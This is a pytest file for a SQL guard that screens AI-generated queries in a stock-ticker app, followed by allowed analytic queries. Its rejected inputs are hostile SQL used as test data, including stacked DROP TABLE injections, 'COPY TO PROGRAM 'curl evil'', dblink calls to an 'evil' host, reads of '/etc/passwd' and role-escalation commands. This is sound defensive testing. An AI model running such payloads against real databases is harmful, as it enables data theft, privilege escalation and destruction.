"""The SQL guard (system design §6, "SQL guard"): adversarial cases first,
then the queries the model is expected to write, which must pass and
round-trip. `tests/integration/test_ai_reader_role.py` proves the role
blocks the same attacks when the guard is bypassed."""

from __future__ import annotations

import pytest

from stockticker.ai.guard import MAX_SQL_CHARS, GuardError, guard_sql


def rejected(sql: str) -> str:
    with pytest.raises(GuardError) as caught:
        guard_sql(sql)
    return str(caught.value)


# --- statement shape -----------------------------------------------------


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT 1; SELECT 2",
        "SELECT 1; DROP TABLE companies",
        "SELECT * FROM ai.companies; DELETE FROM notes",
        "SELECT 1;;SELECT 2",
        "SELECT 1; COMMIT; SELECT 2",
        "SELECT 1; BEGIN; SET TRANSACTION READ WRITE; INSERT INTO notes DEFAULT VALUES",
    ],
)
def test_rejects_stacked_statements(sql: str) -> None:
    assert "exactly one SELECT" in rejected(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT 1 -- ; DROP TABLE companies",
        "SELECT 1 /* ; DROP TABLE companies */",
        "SELECT /* nested /* comment */ still comment ; DROP TABLE x */ 1",
        "SELECT 1 --\n",
    ],
)
def test_comments_are_stripped_and_never_reach_the_database(sql: str) -> None:
    guarded = guard_sql(sql)
    assert guarded.sql == "SELECT 1"
    assert "DROP" not in guarded.wrapped_sql
    assert "--" not in guarded.wrapped_sql and "/*" not in guarded.wrapped_sql


def test_a_trailing_line_comment_cannot_swallow_the_row_cap() -> None:
    guarded = guard_sql("SELECT name FROM ai.companies -- sneaky")
    assert guarded.wrapped_sql.endswith("LIMIT 5001")


def test_comment_hiding_a_second_statement_behind_a_nested_comment_is_one_select() -> None:
    # Postgres nests block comments. The regenerated SQL has no comments at all,
    # so whatever sqlglot thought was inside one cannot run.
    guarded = guard_sql("SELECT 1 /* a /* b */ c */")
    assert guarded.sql == "SELECT 1"


@pytest.mark.parametrize(
    "sql",
    [
        "INSERT INTO ai.notes (body) VALUES ('x')",
        "UPDATE ai.notes SET body = 'x'",
        "DELETE FROM ai.notes",
        "MERGE INTO notes USING companies ON true WHEN MATCHED THEN DELETE",
        "CREATE TABLE x (a int)",
        "CREATE TEMP TABLE x AS SELECT 1",
        "DROP VIEW ai.companies",
        "ALTER ROLE ai_reader SET default_transaction_read_only = off",
        "TRUNCATE notes",
        "GRANT SELECT ON companies TO ai_reader",
        "VACUUM",
        "ANALYZE companies",
        "EXPLAIN ANALYZE SELECT 1",
        "SHOW search_path",
        "VALUES (1), (2)",
        "TABLE ai.companies",
    ],
)
def test_rejects_non_select_statements(sql: str) -> None:
    rejected(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "WITH gone AS (DELETE FROM notes RETURNING *) SELECT * FROM gone",
        "WITH x AS (INSERT INTO notes (body) VALUES ('x') RETURNING id) SELECT * FROM x",
        "WITH x AS (UPDATE notes SET body = 'y' RETURNING id) SELECT 1",
    ],
)
def test_rejects_dml_inside_ctes(sql: str) -> None:
    rejected(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT * INTO stolen FROM ai.companies",
        "SELECT name INTO TEMP t FROM ai.companies",
        "SELECT * INTO UNLOGGED t FROM ai.companies",
    ],
)
def test_rejects_select_into(sql: str) -> None:
    assert "INTO" in rejected(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "COPY companies TO '/tmp/x'",
        "COPY (SELECT * FROM ai.companies) TO PROGRAM 'curl evil'",
        "COPY notes FROM '/etc/passwd'",
    ],
)
def test_rejects_copy(sql: str) -> None:
    rejected(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "DO $$ BEGIN PERFORM pg_sleep(10); END $$",
        "DO LANGUAGE plpgsql $$ BEGIN DELETE FROM notes; END $$",
    ],
)
def test_rejects_do_blocks(sql: str) -> None:
    rejected(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT * FROM ai.companies FOR UPDATE",
        "SELECT * FROM ai.companies FOR SHARE",
        "SELECT * FROM ai.companies FOR NO KEY UPDATE NOWAIT",
        "SELECT * FROM ai.companies FOR KEY SHARE SKIP LOCKED",
        "SELECT * FROM (SELECT * FROM ai.notes FOR UPDATE) q",
        "LOCK TABLE ai.companies",
    ],
)
def test_rejects_locking(sql: str) -> None:
    rejected(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "SET statement_timeout = 0",
        "SET LOCAL transaction_read_only = off",
        "SET SESSION AUTHORIZATION postgres",
        "SET ROLE app_writer",
        "RESET ALL",
        "RESET statement_timeout",
        "BEGIN",
        "COMMIT",
        "ROLLBACK",
        "START TRANSACTION READ WRITE",
        "DISCARD ALL",
        "PREPARE p AS SELECT 1",
        "EXECUTE p",
        "DEALLOCATE ALL",
        "LISTEN x",
        "NOTIFY x",
        "LOAD 'plpgsql'",
        "CALL ai.anything()",
    ],
)
def test_rejects_session_and_transaction_control(sql: str) -> None:
    rejected(sql)


# --- functions ------------------------------------------------------------


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT query_to_xml('SELECT * FROM public.companies', true, true, '')",
        "SELECT query_to_json('SELECT 1')",
        "SELECT * FROM query_to_xml('select 1', true, true, '') x",
        "SELECT set_config('transaction_read_only', 'off', true)",
        "SELECT set_config('statement_timeout', '0', false)",
        "SELECT current_setting('data_directory')",
        "SELECT pg_sleep(10)",
        "SELECT pg_sleep_for('10 seconds')",
        "SELECT pg_catalog.pg_sleep(10)",
        'SELECT "pg_sleep"(10)',
        "SELECT PG_SLEEP(10)",
        "SELECT pg_advisory_lock(1)",
        "SELECT pg_try_advisory_lock(1)",
        "SELECT pg_advisory_xact_lock(1)",
        "SELECT dblink('host=evil', 'select 1')",
        "SELECT * FROM dblink('host=evil', 'select 1') AS t(a int)",
        "SELECT dblink_exec('host=evil', 'drop table x')",
        "SELECT lo_import('/etc/passwd')",
        "SELECT lo_export(1, '/tmp/x')",
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT pg_read_binary_file('/etc/passwd')",
        "SELECT pg_ls_dir('.')",
        "SELECT pg_stat_file('postgresql.conf')",
        "SELECT pg_terminate_backend(1)",
        "SELECT pg_cancel_backend(1)",
        "SELECT pg_reload_conf()",
        "SELECT txid_current()",
        "SELECT nextval('events_id_seq')",
        "SELECT setval('events_id_seq', 1)",
        "SELECT version()",
        "SELECT current_user",
        "SELECT session_user",
        "SELECT current_database()",
        "SELECT inet_server_addr()",
        "SELECT pg_backend_pid()",
        "SELECT has_table_privilege('companies', 'select')",
        "SELECT to_regclass('pg_authid')",
        "SELECT xmlparse(document '<a/>')",
        "SELECT generate_series(1, 1000000000) FROM ai.companies, pg_sleep(1)",
        "SELECT public.some_function()",
        "SELECT pg_catalog.lower('A')",
        "SELECT ai.not_a_function()",
        "SELECT name FROM ai.companies WHERE pg_sleep(1) IS NOT NULL",
        "SELECT (SELECT pg_sleep(1))",
        "WITH x AS (SELECT pg_sleep(1)) SELECT * FROM x",
        "SELECT * FROM ai.companies ORDER BY pg_sleep(1)",
    ],
)
def test_rejects_functions_off_the_allow_list(sql: str) -> None:
    rejected(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT 'pg_authid'::regclass",
        "SELECT CAST('now' AS regproc)",
        "SELECT '1'::oid",
        "SELECT 'x'::xml",
        "SELECT '(1,2)'::point",
    ],
)
def test_rejects_casts_to_catalog_and_exotic_types(sql: str) -> None:
    assert "Cast to" in rejected(sql)


# --- tables and schemas ---------------------------------------------------


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT * FROM pg_catalog.pg_authid",
        "SELECT * FROM pg_catalog.pg_class",
        "SELECT * FROM pg_authid",
        "SELECT * FROM pg_class",
        "SELECT * FROM pg_roles",
        "SELECT * FROM pg_stat_activity",
        "SELECT * FROM pg_settings",
        "SELECT * FROM information_schema.tables",
        "SELECT * FROM information_schema.columns",
        'SELECT * FROM "information_schema"."tables"',
        "SELECT * FROM public.companies",
        "SELECT * FROM public.notes",
        "SELECT * FROM stockticker.public.companies",
        "SELECT * FROM daily_bars",
        "SELECT * FROM shares_outstanding",
        "SELECT * FROM ingest_runs",
        "SELECT * FROM ai_usage",
        "SELECT * FROM alembic_version",
        "SELECT * FROM ai.daily_bars",
        "SELECT * FROM ai.companies c JOIN public.notes n ON true",
        "SELECT * FROM ai.companies WHERE cik IN (SELECT cik FROM public.companies)",
        "SELECT EXISTS (SELECT 1 FROM pg_catalog.pg_proc)",
        "SELECT * FROM LATERAL (SELECT * FROM pg_class) s",
        "SELECT * FROM ai.companies UNION SELECT * FROM public.companies",
    ],
)
def test_rejects_tables_outside_the_ai_views(sql: str) -> None:
    rejected(sql)


@pytest.mark.parametrize(
    "sql",
    [
        # A CTE named like a catalog table is fine; the name outside its scope
        # would resolve through search_path to the real catalog table.
        "SELECT * FROM (WITH pg_authid AS (SELECT 1 AS a) SELECT * FROM pg_authid) inner_q, pg_authid",
        "WITH a AS (SELECT * FROM b), b AS (SELECT 1) SELECT * FROM a",
        "WITH a AS (SELECT * FROM a) SELECT * FROM a",
        "SELECT (WITH pg_class AS (SELECT 1) SELECT 1), (SELECT relname FROM pg_class LIMIT 1)",
    ],
)
def test_cte_names_only_resolve_in_their_own_scope(sql: str) -> None:
    rejected(sql)


def test_a_cte_shadowing_an_ai_view_cannot_smuggle_a_base_table() -> None:
    assert "public" in rejected("WITH companies AS (SELECT * FROM public.companies) SELECT * FROM companies")


@pytest.mark.parametrize(
    "sql",
    [
        "WITH pg_authid AS (SELECT 1 AS rolname) SELECT * FROM pg_authid",
        "WITH companies AS (SELECT cik FROM ai.companies) SELECT * FROM companies",
        "WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r WHERE n < 5) SELECT * FROM r",
        "WITH a AS (SELECT 1 AS x), b AS (SELECT * FROM a) SELECT * FROM b",
    ],
)
def test_ctes_in_scope_are_allowed(sql: str) -> None:
    guard_sql(sql)


def test_error_lists_the_ai_views_so_the_model_can_fix_the_query() -> None:
    message = rejected("SELECT * FROM daily_bars")
    assert "ai.daily_prices" in message or "daily_prices" in message


# --- input size and garbage -------------------------------------------------


def test_rejects_very_long_input_before_parsing() -> None:
    sql = "SELECT " + " + ".join(["1"] * (MAX_SQL_CHARS // 4 + 1))
    assert len(sql) > MAX_SQL_CHARS
    assert "limit" in rejected(sql)


def test_rejects_deep_nesting_without_crashing() -> None:
    sql = "SELECT " + "(" * 2_000 + "1" + ")" * 2_000
    rejected(sql)


@pytest.mark.parametrize("sql", ["", "   ", ";", "SELEC 1", "SELECT FROM WHERE", "\x00SELECT 1"])
def test_rejects_empty_and_garbage(sql: str) -> None:
    rejected(sql)


# --- what the model is expected to write ------------------------------------

LEGITIMATE = [
    "SELECT * FROM ai.returns_between(date '2020-01-01', date '2020-12-31') r ORDER BY pct_change LIMIT 5",
    "SELECT ai.today_ny()",
    "SELECT cik, name FROM ai.companies WHERE name ILIKE '%apple%'",
    "SELECT name FROM companies WHERE name ~* 'apple'",
    """SELECT c.name, l.symbol, m.trade_date, m.market_cap, m.is_multi_class
       FROM ai.market_caps m
       JOIN ai.companies c ON c.cik = m.cik
       LEFT JOIN ai.listings l ON l.cik = m.cik AND l.is_primary AND l.is_active
       WHERE m.trade_date = (SELECT max(trade_date) FROM ai.market_caps WHERE trade_date <= ai.today_ny())
       ORDER BY m.market_cap DESC LIMIT 5""",
    """SELECT symbol, trade_date, adj_close,
              avg(adj_close) OVER (PARTITION BY symbol ORDER BY trade_date
                                   ROWS BETWEEN 19 PRECEDING AND CURRENT ROW) AS ma20
       FROM ai.daily_prices WHERE trade_date >= ai.today_ny() - interval '1 year'""",
    """SELECT date_trunc('month', trade_date)::date AS m,
              percentile_cont(0.5) WITHIN GROUP (ORDER BY daily_return) AS median
       FROM daily_prices GROUP BY 1 ORDER BY 1""",
    "SELECT count(*) FILTER (WHERE daily_return < 0), extract(year FROM trade_date) "
    "FROM daily_prices GROUP BY 2",
    "SELECT DISTINCT ON (symbol) symbol, trade_date FROM daily_prices ORDER BY symbol, trade_date DESC",
    "SELECT details->>'ratio' AS ratio, (details->'items')::text FROM events WHERE kind = 'split'",
    "SELECT d::date FROM generate_series(date '2020-01-01', date '2020-02-01', interval '1 day') AS d",
    "SELECT coalesce(price, 0), nullif(price, 0), greatest(1, 2), least(1, 2), round(price::numeric, 2) "
    "FROM quotes",
    "SELECT lower(name), upper(name), length(name), substring(name FROM 1 FOR 3), trim(name) FROM companies",
    "SELECT concat(name, ' ', sector), name || sector, to_char(date_added, 'YYYY-MM') FROM companies",
    """SELECT stddev(daily_return), rank() OVER (ORDER BY trade_date), lag(close) OVER (ORDER BY trade_date),
              row_number() OVER () FROM daily_prices""",
    "SELECT mode() WITHIN GROUP (ORDER BY sector) FROM companies",
    "SELECT symbol FROM listings UNION ALL SELECT symbol FROM quotes",
    "SELECT array_agg(symbol ORDER BY symbol), string_agg(symbol, ',') FROM listings",
    "SELECT age(now(), date '2020-01-01'), now() AT TIME ZONE 'America/New_York'",
    """SELECT CASE WHEN price > 100 THEN 'high' ELSE 'low' END, price BETWEEN 1 AND 2,
              EXISTS (SELECT 1 FROM quotes) FROM quotes WHERE symbol IN (SELECT symbol FROM listings)""",
    "SELECT n.start_date, n.body FROM ai.notes n WHERE n.body ILIKE '%earnings%' ORDER BY n.start_date DESC",
    "SELECT symbol, close FROM daily_prices ORDER BY close DESC NULLS LAST LIMIT 3",
    "(SELECT 1)",
    "SELECT 1;",
]


@pytest.mark.parametrize("sql", LEGITIMATE)
def test_allows_expected_queries(sql: str) -> None:
    guarded = guard_sql(sql)
    assert guarded.wrapped_sql == f"SELECT * FROM ({guarded.sql}) AS q LIMIT 5001"


@pytest.mark.parametrize("sql", LEGITIMATE)
def test_regenerated_sql_is_a_fixed_point(sql: str) -> None:
    once = guard_sql(sql).sql
    assert guard_sql(once).sql == once


def test_order_by_nulls_last_survives_the_rewrite() -> None:
    assert "DESC NULLS LAST" in guard_sql("SELECT close FROM daily_prices ORDER BY close DESC NULLS LAST").sql


def test_unqualified_names_must_be_known_views() -> None:
    guard_sql("SELECT * FROM quotes", ai_views=frozenset({"quotes"}))
    with pytest.raises(GuardError):
        guard_sql("SELECT * FROM quotes", ai_views=frozenset({"companies"}))
